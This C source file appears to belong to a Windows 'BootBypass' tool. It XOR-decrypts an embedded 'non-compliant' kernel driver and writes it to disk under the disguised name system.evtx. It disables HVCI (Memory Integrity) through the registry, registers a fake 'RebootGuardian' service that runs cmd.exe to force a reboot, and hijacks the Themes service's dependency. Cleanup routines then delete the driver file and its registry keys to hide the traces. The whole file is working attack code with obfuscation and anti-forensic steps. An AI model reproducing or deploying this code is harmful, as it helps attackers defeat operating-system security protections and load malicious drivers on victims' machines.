#include "SetupManager.h"

// External declaration for Assembly Telemetry (Stealth Decoder) needed for Cleanup
extern PWSTR MmGetPoolDiagnosticString(void);

// ============================================================================
// RESOURCE EXTRACTION - Extract embedded non-compliant driver from PE resources
// ============================================================================

#define IDR_DRV 101
#define OmniDriver_SIZE 14024

static const UCHAR XOR_KEY[] = { 0xA0, 0xE2, 0x80, 0x8B, 0xE2, 0x80, 0x8C };
static const SIZE_T XOR_KEY_LEN = sizeof(XOR_KEY);

// Internal helper to traverse PE headers
PVOID FindResourceData(ULONG resourceId, PULONG outSize) {
    PVOID imageBase = NULL;

    #ifdef _M_X64
        imageBase = (PVOID)*(ULONGLONG*)((UCHAR*)__readgsqword(0x60) + 0x10);
    #else
        imageBase = (PVOID)*(ULONG*)((UCHAR*)__readfsdword(0x30) + 0x08);
    #endif

    if (!imageBase) {
        DEBUG_LOG(L"DEBUG: Cannot get image base\r\n");
        return NULL;
    }

    DEBUG_LOG(L"DEBUG: Image base found\r\n");

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;

    if (dosHeader->e_magic != 0x5A4D) {
        DEBUG_LOG(L"DEBUG: Invalid DOS header\r\n");
        return NULL;
    }

    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((UCHAR*)imageBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != 0x4550) {
        DEBUG_LOG(L"DEBUG: Invalid PE signature\r\n");
        return NULL;
    }

    PIMAGE_DATA_DIRECTORY resourceDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];
    if (resourceDir->Size == 0) {
        DEBUG_LOG(L"DEBUG: No resource directory\r\n");
        return NULL;
    }

    PIMAGE_RESOURCE_DIRECTORY resRoot = (PIMAGE_RESOURCE_DIRECTORY)((UCHAR*)imageBase + resourceDir->VirtualAddress);
    PIMAGE_RESOURCE_DIRECTORY_ENTRY resEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(resRoot + 1);

    // Search for RT_RCDATA (type 10)
    for (ULONG i = 0; i < (ULONG)(resRoot->NumberOfNamedEntries + resRoot->NumberOfIdEntries); i++) {
        if (!resEntry[i].NameIsString && resEntry[i].Id == 10) {
            
            PIMAGE_RESOURCE_DIRECTORY typeDir = (PIMAGE_RESOURCE_DIRECTORY)((UCHAR*)resRoot + (resEntry[i].OffsetToDirectory & 0x7FFFFFFF));
            PIMAGE_RESOURCE_DIRECTORY_ENTRY typeEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(typeDir + 1);

            // Search for specific resource ID
            for (ULONG j = 0; j < (ULONG)(typeDir->NumberOfNamedEntries + typeDir->NumberOfIdEntries); j++) {
                if (!typeEntry[j].NameIsString && typeEntry[j].Id == resourceId) {
                    
                    PIMAGE_RESOURCE_DIRECTORY nameDir = (PIMAGE_RESOURCE_DIRECTORY)((UCHAR*)resRoot + (typeEntry[j].OffsetToDirectory & 0x7FFFFFFF));
                    PIMAGE_RESOURCE_DIRECTORY_ENTRY nameEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(nameDir + 1);

                    if (nameDir->NumberOfIdEntries > 0) {
                        PIMAGE_RESOURCE_DATA_ENTRY dataEntry = (PIMAGE_RESOURCE_DATA_ENTRY)((UCHAR*)resRoot + nameEntry[0].OffsetToData);
                        *outSize = dataEntry->Size;
                        return (PVOID)((UCHAR*)imageBase + dataEntry->OffsetToData);
                    }
                }
            }
        }
    }

    return NULL;
}

BOOLEAN ExtractOmniDriverFromResource(void) {
    ULONG resourceSize = 0;
    PVOID resourceData = FindResourceData(IDR_DRV, &resourceSize);

    if (!resourceData || resourceSize != OmniDriver_SIZE) {
        DisplayMessage(L"FAILED: Cannot find non-compliant driver resource\r\n");
        return FALSE;
    }

    DEBUG_LOG(L"INFO: Extracting non-compliant driver from resource...\r\n");

    UCHAR decryptedData[OmniDriver_SIZE];

    UCHAR* srcData = (UCHAR*)resourceData;
    for (SIZE_T i = 0; i < OmniDriver_SIZE; i++) {
        decryptedData[i] = srcData[i] ^ XOR_KEY[i % XOR_KEY_LEN];
    }

    UNICODE_STRING usFilePath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    LARGE_INTEGER byteOffset;
    NTSTATUS status;

    RtlInitUnicodeString(&usFilePath, OmniDriver_Log);
    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
                         NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF,
                         FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"FAILED: Cannot create temporary driver file");
        DisplayStatus(status);
        return FALSE;
    }

    byteOffset.QuadPart = 0;
    status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, decryptedData,
                        OmniDriver_SIZE, &byteOffset, NULL);

    NtClose(hFile);

    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"FAILED: Cannot write driver file");
        DisplayStatus(status);
        return FALSE;
    }

    DEBUG_LOG(L"SUCCESS: Non-compliant driver extracted to system.evtx\r\n");
    return TRUE;
}

NTSTATUS CleanupOmniDriver(void) {
    UNICODE_STRING usFilePath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    FILE_DISPOSITION_INFORMATION dispInfo;
    NTSTATUS status;

    // Delete the temporary driver file
    RtlInitUnicodeString(&usFilePath, OmniDriver_Log);
    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

    status = NtOpenFile(&hFile, DELETE | SYNCHRONIZE, &oa, &iosb,
                       FILE_SHARE_DELETE, FILE_SYNCHRONOUS_IO_NONALERT);

    if (NT_SUCCESS(status)) {
        dispInfo.DeleteFile = TRUE;
        NtSetInformationFile(hFile, &iosb, &dispInfo, sizeof(dispInfo), 13);
        NtClose(hFile);
        DEBUG_LOG(L"INFO: Temporary driver file deleted\r\n");
    }

    // Delete the service registry key
    WCHAR fullServicePath[MAX_PATH_LEN];
    UNICODE_STRING usServiceName;
    HANDLE hKey;
    PWSTR driverName = MmGetPoolDiagnosticString();

    wcscpy(fullServicePath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
    wcscat(fullServicePath, driverName);

    RtlInitUnicodeString(&usServiceName, fullServicePath);
    InitializeObjectAttributes(&oa, &usServiceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKey(&hKey, DELETE, &oa);
    if (NT_SUCCESS(status)) {
        NtDeleteKey(hKey);
        NtClose(hKey);
        DEBUG_LOG(L"INFO: Non-compliant driver registry key deleted\r\n");
    }

    return STATUS_SUCCESS;
}

// ============================================================================
// HVCI & REBOOT GUARDIAN - Memory Integrity control
// ============================================================================

BOOLEAN CheckAndDisableHVCI(void) {
    UNICODE_STRING usKeyPath, usValueName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;
    UCHAR buffer[256];
    ULONG resultLength;
    PKEY_VALUE_PARTIAL_INFORMATION kvpi;
    ULONG currentValue;

    RtlInitUnicodeString(&usKeyPath, HVCI_REG_PATH);
    InitializeObjectAttributes(&oa, &usKeyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKey(&hKey, KEY_ALL_ACCESS, &oa);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    RtlInitUnicodeString(&usValueName, L"Enabled");
    memset_impl(buffer, 0, sizeof(buffer));

    status = NtQueryValueKey(hKey, &usValueName, KeyValuePartialInformation,
                            buffer, sizeof(buffer), &resultLength);

    if (!NT_SUCCESS(status)) {
        NtClose(hKey);
        return FALSE;
    }

    kvpi = (PKEY_VALUE_PARTIAL_INFORMATION)buffer;

    if (kvpi->Type != REG_DWORD || kvpi->DataLength != sizeof(ULONG)) {
        NtClose(hKey);
        return FALSE;
    }

    currentValue = *(ULONG*)kvpi->Data;

    if (currentValue == 1) {
        DisplayMessage(L"INFO: HVCI (Memory Integrity) is enabled\r\n");
        DisplayMessage(L"INFO: Disabling HVCI...\r\n");

        ULONG newValue = 0;
        status = NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &newValue, sizeof(ULONG));

        if (!NT_SUCCESS(status)) {
            DisplayMessage(L"FAILED: Cannot disable HVCI");
            DisplayStatus(status);
            NtClose(hKey);
            return FALSE;
        }

        RtlInitUnicodeString(&usValueName, L"WasEnabledBy");
        NtDeleteValueKey(hKey, &usValueName);
        NtFlushKey(hKey);
        NtClose(hKey);

        DisplayMessage(L"INFO: Scheduling reboot via Guardian service...\r\n");

        NTSTATUS serviceStatus = CreateRebootGuardianService();
        if (NT_SUCCESS(serviceStatus)) {
            AddThemesDependency();
            DisplayMessage(L"SUCCESS: HVCI disabled, automatic reboot scheduled\r\n");
        } else {
            DisplayMessage(L"WARNING: HVCI disabled but service creation had issues");
            DisplayStatus(serviceStatus);
            DisplayMessage(L"INFO: Please reboot manually\r\n");
        }

        return TRUE;
    }

    NtClose(hKey);
    return FALSE;
}

NTSTATUS RestoreHVCI(void) {
    UNICODE_STRING usKeyPath, usValueName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;

    DisplayMessage(L"INFO: Re-enabling HVCI for next boot...\r\n");

    RtlInitUnicodeString(&usKeyPath, HVCI_REG_PATH);
    InitializeObjectAttributes(&oa, &usKeyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKey(&hKey, KEY_WRITE, &oa);
    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"WARNING: Cannot open HVCI key");
        DisplayStatus(status);
        return status;
    }

    RtlInitUnicodeString(&usValueName, L"Enabled");
    ULONG enableValue = 1;
    status = NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &enableValue, sizeof(ULONG));

    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"WARNING: Cannot re-enable HVCI");
        DisplayStatus(status);
        NtClose(hKey);
        return status;
    }

    RtlInitUnicodeString(&usValueName, L"WasEnabledBy");
    ULONG wasEnabledBy = 2;
    NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &wasEnabledBy, sizeof(ULONG));

    NtFlushKey(hKey);
    NtClose(hKey);

    DisplayMessage(L"SUCCESS: HVCI will be re-enabled on next boot\r\n");
    return STATUS_SUCCESS;
}

NTSTATUS CreateRebootGuardianService(void) {
    WCHAR fullServicePath[MAX_PATH_LEN];
    UNICODE_STRING usServiceName, usValueName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;
    ULONG disposition;
    DWORD dwValue;

    DisplayMessage(L"INFO: Creating Reboot Guardian service...\r\n");

    wcscpy(fullServicePath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
    wcscat(fullServicePath, L"RebootGuardian");

    RtlInitUnicodeString(&usServiceName, fullServicePath);
    InitializeObjectAttributes(&oa, &usServiceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateKey(&hKey, KEY_ALL_ACCESS, &oa, 0, NULL, REG_OPTION_NON_VOLATILE, &disposition);
    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"FAILED: Cannot create Guardian service");
        DisplayStatus(status);
        return status;
    }

    RtlInitUnicodeString(&usValueName, L"ImagePath");
    WCHAR imagePath[] = L"cmd.exe /c \"sc delete RebootGuardian & reg delete HKLM\\System\\CurrentControlSet\\Services\\Themes /v DependOnService /f & shutdown /r /t 0 /f\"";
    status = NtSetValueKey(hKey, &usValueName, 0, REG_EXPAND_SZ,
                          imagePath, (ULONG)((wcslen(imagePath) + 1) * sizeof(WCHAR)));

    RtlInitUnicodeString(&usValueName, L"DisplayName");
    WCHAR displayName[] = L"BootBypass Reboot Guardian";
    NtSetValueKey(hKey, &usValueName, 0, REG_SZ,
                 displayName, (ULONG)((wcslen(displayName) + 1) * sizeof(WCHAR)));

    RtlInitUnicodeString(&usValueName, L"Type");
    dwValue = 0x110;
    NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &dwValue, sizeof(DWORD));

    RtlInitUnicodeString(&usValueName, L"Start");
    dwValue = 0x3;
    NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &dwValue, sizeof(DWORD));

    RtlInitUnicodeString(&usValueName, L"ErrorControl");
    dwValue = 0x1;
    NtSetValueKey(hKey, &usValueName, 0, REG_DWORD, &dwValue, sizeof(DWORD));

    RtlInitUnicodeString(&usValueName, L"ObjectName");
    WCHAR objectName[] = L"LocalSystem";
    NtSetValueKey(hKey, &usValueName, 0, REG_SZ,
                 objectName, (ULONG)((wcslen(objectName) + 1) * sizeof(WCHAR)));

    NtFlushKey(hKey);
    NtClose(hKey);

    if (NT_SUCCESS(status)) {
        DisplayMessage(L"SUCCESS: Reboot Guardian service created\r\n");
        return STATUS_SUCCESS;
    } else {
        DisplayMessage(L"WARNING: Service created but some values failed");
        DisplayStatus(status);
        return status;
    }
}

NTSTATUS RemoveRebootGuardianService(void) {
    WCHAR fullServicePath[MAX_PATH_LEN];
    UNICODE_STRING usServiceName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;

    wcscpy(fullServicePath, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
    wcscat(fullServicePath, L"RebootGuardian");

    RtlInitUnicodeString(&usServiceName, fullServicePath);
    InitializeObjectAttributes(&oa, &usServiceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKey(&hKey, DELETE, &oa);
    if (NT_SUCCESS(status)) {
        NtDeleteKey(hKey);
        NtClose(hKey);
        DEBUG_LOG(L"INFO: Reboot Guardian service removed\r\n");
    }

    return status;
}

NTSTATUS AddThemesDependency(void) {
    UNICODE_STRING usKeyPath, usValueName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;

    DisplayMessage(L"INFO: Adding Themes dependency...\r\n");

    RtlInitUnicodeString(&usKeyPath,
        L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Themes");
    InitializeObjectAttributes(&oa, &usKeyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKey(&hKey, KEY_WRITE, &oa);
    if (!NT_SUCCESS(status)) {
        DisplayMessage(L"FAILED: Cannot open Themes service");
        DisplayStatus(status);
        return status;
    }

    RtlInitUnicodeString(&usValueName, L"DependOnService");
    WCHAR dependency[] = L"RebootGuardian\0\0";

    status = NtSetValueKey(hKey, &usValueName, 0, REG_MULTI_SZ,
                          dependency, sizeof(dependency));

    if (NT_SUCCESS(status)) {
        NtFlushKey(hKey);
        DisplayMessage(L"SUCCESS: Themes dependency added\r\n");
    } else {
        DisplayMessage(L"FAILED: Cannot add dependency");
        DisplayStatus(status);
    }

    NtClose(hKey);
    return status;
}

NTSTATUS RemoveThemesDependency(void) {
    UNICODE_STRING usKeyPath, usValueName;
    OBJECT_ATTRIBUTES oa;
    HANDLE hKey = NULL;
    NTSTATUS status;

    RtlInitUnicodeString(&usKeyPath,
        L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Themes");
    InitializeObjectAttributes(&oa, &usKeyPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenKey(&hKey, KEY_WRITE, &oa);
    if (!NT_SUCCESS(status)) {
        return status;
    }

    RtlInitUnicodeString(&usValueName, L"DependOnService");
    status = NtDeleteValueKey(hKey, &usValueName);

    if (NT_SUCCESS(status)) {
        NtFlushKey(hKey);
        DEBUG_LOG(L"INFO: Themes dependency removed\r\n");
    }

    NtClose(hKey);
    return status;
}